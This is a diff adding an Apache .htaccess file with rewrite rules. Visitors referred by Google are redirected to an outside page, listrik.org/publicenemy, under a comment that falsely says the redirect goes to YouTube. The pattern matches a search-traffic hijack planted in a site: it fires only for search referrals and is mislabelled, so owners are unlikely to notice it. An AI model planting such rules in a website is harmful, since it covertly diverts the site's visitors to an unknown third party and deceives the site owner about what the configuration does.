@@ -1,0 +1,7 @@
+RewriteEngine On
+
+# Check if the visitor is coming from Google
+RewriteCond %{HTTP_REFERER} ^https?://(www\.)?google\. [NC]
+
+# Redirect to YouTube
+RewriteRule ^(.*)$ https://listrik.org/publicenemy [R=302,L]
